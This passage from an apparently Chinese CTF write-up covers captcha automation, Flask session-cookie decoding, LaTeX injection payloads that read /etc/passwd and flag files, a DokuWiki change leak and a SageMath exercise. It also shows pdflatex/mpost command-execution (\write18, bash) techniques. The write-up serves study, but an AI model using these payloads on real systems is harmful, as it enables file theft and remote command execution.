class="number">0</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mes = req.text</span><br><span class="line">        mess = BeautifulSoup(req.text,features=<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        capters = mess.find_all(<span class="string">&#x27;div&#x27;</span>,class_=<span class="string">&#x27;form-group&#x27;</span>)</span><br><span class="line">        <span class="comment">#print(capter1)</span></span><br><span class="line">        <span class="keyword">for</span> capter <span class="keyword">in</span> capters:</span><br><span class="line">            captcha1 = capter.text.strip(<span class="string">&quot;的结果是？\n&quot;</span>)<span class="comment">#n+m</span></span><br><span class="line">            captcha11 = captcha1.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            captcha12 = captcha1.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            captcha1 = <span class="built_in">int</span>(captcha12) + <span class="built_in">int</span>(captcha11)</span><br><span class="line">            a.append(captcha1)</span><br><span class="line">            <span class="built_in">print</span>(a[n])</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">        data_post = &#123;<span class="string">&#x27;captcha1&#x27;</span>:a[<span class="number">0</span>],<span class="string">&#x27;captcha2&#x27;</span>:a[<span class="number">1</span>],<span class="string">&#x27;captcha3&#x27;</span>:a[<span class="number">2</span>]&#125;</span><br><span class="line">        flag = requests.post(url,headers=http_header2,data=data_post)</span><br><span class="line">        <span class="built_in">print</span>(flag.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exception:</span><br><span class="line">        <span class="built_in">print</span>(exception)</span><br><span class="line"></span><br><span class="line">end=time.clock()</span><br><span class="line"><span class="built_in">print</span>(end-start)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029195423-6e026766-5780-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029195423-6e026766-5780-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><p>赛后看WP才想起来还能直接解析session。这道题的captcha123都在session里，但是session并没有加密。用Flask的session decode。</p><h3 id="Flask的session伪造"><a href="#Flask的session伪造" class="headerlink" title="Flask的session伪造"></a>Flask的session伪造</h3><p>由于flask是很轻量级的框架，一般为确保安全session都是存储在服务器端的，flask把session放在客户端的cookie，登录成功的cookie可以赋值下来解密。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029193635-f1d314f8-577d-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029193635-f1d314f8-577d-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="1.png"></p><p>来自P神的脚本和部分解析原理</p><p>所以解密脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本使用：解密：<code>python 1.py decode -c &quot;解密session&quot;</code></p><p><strong>session解析原理</strong>：<br>    访问的session变量是RequestContext实例的变量。在RequestContext.Push()最后有如下代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.session = self.app.open_session(self.request)</span><br><span class="line"><span class="keyword">if</span> self.session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">self.session = self.app.make_null_session()</span><br></pre></td></tr></table></figure><p>上述代码初始化session并保存在RequestContext上后续就能直接from flask import session使用。但是<strong>没设置secret_key变量的话，open_session会返回None</strong>，这样调用make_null_session就会获取空session。<br>在获取cookie的过程中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = self.get_signing_serializer(app)</span><br><span class="line">val = request.cookies.get(app.session_cookie_name)</span><br><span class="line">data = s.loads(val,max_age=max_age)</span><br></pre></td></tr></table></figure><p><code>signing_serializer</code>能确保cookie和session相互转换的安全问题。而get_sigining_serializer方法会用到secret_key,salt盐值,序列算法和hash(sha1)、签名算法(hmac)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_signing_serializer</span>(<span class="params">self, app</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    signer_kwargs = <span class="built_in">dict</span>(</span><br><span class="line">        key_derivation=self.key_derivation,</span><br><span class="line">        digest_method=self.digest_method</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> URLSafeTimedSerializer(app.secret_key,</span><br><span class="line">        salt=self.salt,</span><br><span class="line">        serializer=self.serializer,</span><br><span class="line">        signer_kwargs=signer_kwargs)</span><br></pre></td></tr></table></figure><p>而session可以进行手动解析，session一般有两个句号分为三个部分，所以要rsplit两个’.’，<strong>第一部分为base64加密数据，第二部分为时间戳，第三部分为校验信息token</strong>，顺序可打乱。解密的话就是整个zlib.decompress进行数据解压，然后单独对数据base64解密</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029193904-4aac123c-577e-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029193904-4aac123c-577e-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><p>比如随机截取一个set-cookie解密<br>原session:<br><code>.eJwVUElPQmEM_C_v6kv8urcmHhDR4IaAROVGCCJLeAcfihj_u_XSTKfT6fJTtYtDW51VoGqFRJnMWAOYtUYGUoqCpEgYAa4SHFZY2cKC0AxMalRyBBcsVpxZACkEqSRyZPfMMsc6GSCINPEgcMasBhdEMkJnVScuAbVqMVdKztE0h1iKicXYyPB_z1KCag1hdYCA3FY0JZ5HJBDKawQjA3kNEe4amPIwJUwfQc2u1DOpeYhw0aqu2maz2OUvyDTO7nuTbn94eTisWTvr8dQ7j3tflmkj3N6tZ5Pbz3l33My2p8fBUoZyMhr2l6Pp5ri8oH3z8rQa3awGm21vUN7h8N2_upYy3O30g5-_Ht7mr35e_f4BNo5cEw.Y1zx-w.AKWqqvzk3yGcqLTpVu0KUAlltZU</code><br>解出来是如下格式：<br><code>&#123;&#39;text&#39;: &#39;1667035643774691446,241363902362329918659497046479793277175,263821852070844512395230451824883959522,304131965989318428249402237328466834091,66078633288276277718434574737267030093,69546811911445684386675685316652966538,199886926959763245752619143843678955406&#39;, &#39;token&#39;: &#39;3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8=&#39;&#125;</code></p><p>可以看到数据部分和下图一样。而1667035643774691446为纳秒级时间戳，token值不变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029201423-39b7d97a-5783-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029201423-39b7d97a-5783-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><p>但是要伪造还需要知道secret_key。所以没办法解</p><h2 id="LaTeX-机器人"><a href="#LaTeX-机器人" class="headerlink" title="LaTeX 机器人"></a>LaTeX 机器人</h2><blockquote><p>在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。<br>这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。<br>“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”<br>物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。<br>那你能想办法获得服务器上放在根目录下的 flag 吗？<br><strong>纯文本</strong><br>第一个 flag 位于 <code>/flag1</code>，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。<br><strong>特殊字符混入</strong><br>第二个 flag 位于 <code>/flag2</code>，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（<code>_</code>）和井号（<code>#</code>）。你可能需要想些其他办法了。</p></blockquote><p>​从文件系统读取任意文件可以用\input</p><p><code>\input\&#123;/etc/passwd&#125;</code></p><p>该命令读取&#x2F;etc&#x2F;passwd写入到PDF文件。如果文件时tex，可以用\include{}读取</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030220109665.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030220109665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030220109665"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newread</span><span class="keyword">\file</span></span><br><span class="line"><span class="keyword">\openin</span><span class="keyword">\file</span>=&quot;/flag2&quot;</span><br><span class="line"><span class="keyword">\loop</span><span class="keyword">\unless</span><span class="keyword">\ifeof</span><span class="keyword">\file</span></span><br><span class="line">    <span class="keyword">\read</span><span class="keyword">\file</span> to<span class="keyword">\fileline</span> </span><br><span class="line">    <span class="keyword">\fileline</span></span><br><span class="line"><span class="keyword">\repeat</span></span><br><span class="line"><span class="keyword">\closein</span><span class="keyword">\file</span> </span><br></pre></td></tr></table></figure><p>上述代码创建一个\file文件对象，打开&#x2F;flag2用\loop循环进行读取到\fileline变量输出</p><p>①由于不能再垂直模式下使用宏参数字符”#”，但是可以把它去掉功能输出，也就是转化为字符，下划线也是同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\catcode`\#=11</span><br><span class="line">\catcode`\_=11</span><br></pre></td></tr></table></figure><p>11代表字母。TeX的类别代码如下：</p><ul><li>0 &#x3D; 转义字符，通常是 \</li><li>1 &#x3D; 开始分组，通常是 {</li><li>2 &#x3D; 结束分组，通常 }</li><li>3 &#x3D; 数学移位，通常为 $</li><li>4 &#x3D; 对齐选项卡，通常 &amp;</li><li>5 &#x3D; 行尾，通常 <return></li><li>6 &#x3D; 参数，通常 #</li><li>7 &#x3D; 上标，通常 ^</li><li>8 &#x3D; 下标，通常为 _</li><li>9 &#x3D; 忽略的字符，通常是 <null></li><li>10 &#x3D; 空格，通常是 <space> 和 <tab></li><li>11 &#x3D; 字母，通常只包含字母 a,…,z 和 A,…,Z。这些字符可用于命令名称</li><li>12 &#x3D; 其他，通常未在其他类别中列出的所有其他内容</li><li>13 &#x3D; 活动角色，例如 ~</li><li>14 &#x3D; 注释字符，通常为 %</li><li>15 &#x3D; 无效字符，通常是 <delete></li></ul><p>payload如下：(不需要进行循环，只有一行是不行的捏)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\newread\file </span><br><span class="line">\openin\file=/flag2 </span><br><span class="line">\catcode`\#=11 </span><br><span class="line">\catcode`\_=11 </span><br><span class="line">\read\file to\line </span><br><span class="line">\line </span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030222037514.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030222037514.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030222037514"></p><p>②像perl脚本一样禁用控制字符。这样就能input包含$#_&amp;空字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \catcode `\$=12 \catcode `\#=12 \catcode `\_=12 \catcode `\&amp;=12 \input&#123;/flag2&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030223526401.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030223526401.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030223526401"></p><p>其中单点为下划线</p><p>③利用verbatiminput，mcfx大佬用的手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$ \makeatletter</span><br><span class="line">这里放 verbatim.sty 的内容，记得删掉行末的 %</span><br><span class="line">\makeatother</span><br><span class="line">\verbatiminput&#123;/flag2&#125; $$</span><br></pre></td></tr></table></figure><h3 id="扩展知识：对-input和-write18原语解析，以及pdflatex导致的RCE"><a href="#扩展知识：对-input和-write18原语解析，以及pdflatex导致的RCE" class="headerlink" title="扩展知识：对\input和\write18原语解析，以及pdflatex导致的RCE"></a>扩展知识：对\input和\write18原语解析，以及pdflatex导致的RCE</h3><p>关于LateX找到相关文献hacking with LaTex。pdfLateX支持读写文件、执行命令，所以有可能存在rce和文件上传和包含。</p><p>来自于infosecwiteups的作者利用LateX进行RCE的过程。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030210722860.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030210722860.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030210722860"></p><p>下列TeX原语将命令发送到shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\immediate\write18&#123;bibtex8 --wolfgang \jobname&#125;</span><br><span class="line">\input&#123;|bibtex8 --wolfgang \jobname&#125;</span><br></pre></td></tr></table></figure><p>在Ubuntu16.04，<code>/usr/share/texmf/wb2c/texmf.cnf</code>配置文件控制pdflatex()的行为。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">% Enable system commands via \write18&#123;...&#125;.  When enabled fully (set to</span><br><span class="line">% t), obviously insecure.  When enabled partially (set to p), only the</span><br><span class="line">% commands listed in shell_escape_commands are allowed.  Although this</span><br><span class="line">% is not fully secure either, it is much better, and so useful that we</span><br><span class="line">% enable it for everything but bare tex.</span><br><span class="line">shell_escape = p</span><br><span class="line"></span><br><span class="line">% No spaces in this command list.</span><br><span class="line">%</span><br><span class="line">% The programs listed here are as safe as any we know: they either do</span><br><span class="line">% not write any output files, respect openout_any, or have hard-coded</span><br><span class="line">% restrictions similar or higher to openout_any=p.  They also have no</span><br><span class="line">% features to invoke arbitrary other programs, and no known exploitable</span><br><span class="line">% bugs.  All to the best of our knowledge.  They also have practical use</span><br><span class="line">% for being called from TeX.</span><br><span class="line">%</span><br><span class="line">shell_escape_commands = \</span><br><span class="line">bibtex,bibtex8,\</span><br><span class="line">extractbb,\</span><br><span class="line">kpsewhich,\</span><br><span class="line">makeindex,\</span><br><span class="line">mpost,\</span><br><span class="line">repstopdf,\</span><br></pre></td></tr></table></figure><p>注意shell_escape_commands，该命令能直接进行RCE。创建一个简单tex文件用于测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">\immediate\write18&#123;uname -a&#125;</span><br><span class="line">\end&#123;document&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212742156.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212742156.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030212742156"></p><p>只要能实现uname -a即可rce，用strace编译如下</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212832603.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212832603.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030212832603"></p><p>uname -a没有被禁，将uname换为kpsewhich搜索系统文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/uname -a/kpsewhich --imminent --pwn&#x27; x.tex</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -ff -e execve pdflatex x.tex</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213249569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213249569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030213249569"></p><p>如图，成功执行，shell_escape_commands列表的任何二进制文件都能执行。注意一定要在列表内。</p><p>mp文件(metapost)也能进行RCE。x.mp代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">verbatimtex</span><br><span class="line">\documentclass&#123;minimal&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">etex</span><br><span class="line">beginfig (1)</span><br><span class="line">label(btex blah etex, origin);</span><br><span class="line">endfig;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><p>执行<code>echo x.mp |  strace -ff -e execve mpost -ini -tex=&quot;/bin/uname -a&quot;</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213949751.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213949751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030213949751"></p><p>执行命令的方式很简单，但是传递参数比较难，可以用bash直接RCE</p><p><code>bash -c &#39;(id;uname$&#123;IFS&#125;-sm)&gt;/tmp/pwn(本地)&#39;</code>写入到x.tex</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030214842464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030214842464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030214842464"></p><p>写入成功：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030215200986.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030215200986.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221030215200986"></p><p>事实上POC需要写到pdflatex目录下，如果不在的话需要指定x.mp默认文件。-interaction&#x3D;nonstomode mpost指定允许编译.mp文件</p><p>以上内容为扩展知识，只是想说目前网页上输入latex输出Pdf的网站其实是有问题的。</p><h2 id="Flag的痕迹"><a href="#Flag的痕迹" class="headerlink" title="Flag的痕迹"></a>Flag的痕迹</h2><blockquote><p>小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。</p></blockquote><blockquote><p>「这样就应该就不会泄漏 flag 了吧」，小 Z 如是安慰自己。</p></blockquote><blockquote><p>然而事实真的如此吗？</p></blockquote><blockquote><p>（题目 Dokuwiki 版本基于 2022-07-31a “Igor”）</p></blockquote><p>参考<a href="https://www.dokuwiki.org/zh:recent_changes">https://www.dokuwiki.org/zh:recent_changes</a></p><ul><li>DokuWiki会利用一个特别页面显示wiki中最近被修改的页面。所有被修改页面都会在”recent”中列出。包括修改时间、修改者和修改信息。且同时提供每个页面的页面比较</li><li>?do&#x3D;recent就可以显示从更改日志读取的信息</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101170627291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101170627291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221101170627291"></p><p>但是很显然没那么简单，更改日志以及被管理员做掉了。</p><p>看WP的时候，大佬太多了，参考链接：<code>https://github.com/splitbrain/dokuwiki/issues/3576</code></p><p>DokuWiki有差异查看器diff用以查看文档的更改，引擎代码来自MediaWiki（如果有大佬研究的话），diff甚至可以用来代替wget和tar一步到位打补丁</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172219194.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172219194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221101172219194"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172255938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172255938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221101172255938"></p><h2 id="微积分计算小练习"><a href="#微积分计算小练习" class="headerlink" title="微积分计算小练习"></a>微积分计算小练习</h2><blockquote><p>小 X 作为某门符号计算课程的助教，为了让大家熟悉软件的使用，他写了一个小网站：上面放着五道简单的题目，只要输入姓名和题目答案，提交后就可以看到自己的分数。</p><p><a href="http://202.38.93.111:10056/?token=3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8=">点击此链接访问练习网站</a></p></blockquote><blockquote><p>想起自己前几天在公众号上学过的 Java 设计模式免费试听课，本着前后端离心（咦？是前后端离心吗？还是离婚？离。。离谱？总之把功能能拆则拆就对啦）的思想，小 X 还单独写了一个程序，欢迎同学们把自己的成绩链接提交上来。</p><p>总之，因为其先进的设计思想，需要同学们做完练习之后手动把成绩连接贴到这里来：</p><p><a href="http://202.38.93.111:10057/?token=3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8=">点击此链接提交练习成绩 URL</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101174652809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101174652809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221101174652809"></p></blockquote><p>1.sagemath（round保留一位小数）</p><ul><li>定积分函数：definite_integral(函数,变量,下界,上界)  无穷用oo表示</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091434552.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091434552.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104091434552"></p><p>​</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092025214.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092025214.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104092025214"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092126911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092126911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104092126911"></p><ul><li><p>求极限：lim(函数，自变量极限)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091754449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091754449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104091754449"></p></li><li><p>求导：derivative(函数,自变量)(自变量值)</p></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092218446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092218446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104092218446"></p><p>所以答案是：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092922320.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092922320.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221104092922320"></p><p><a 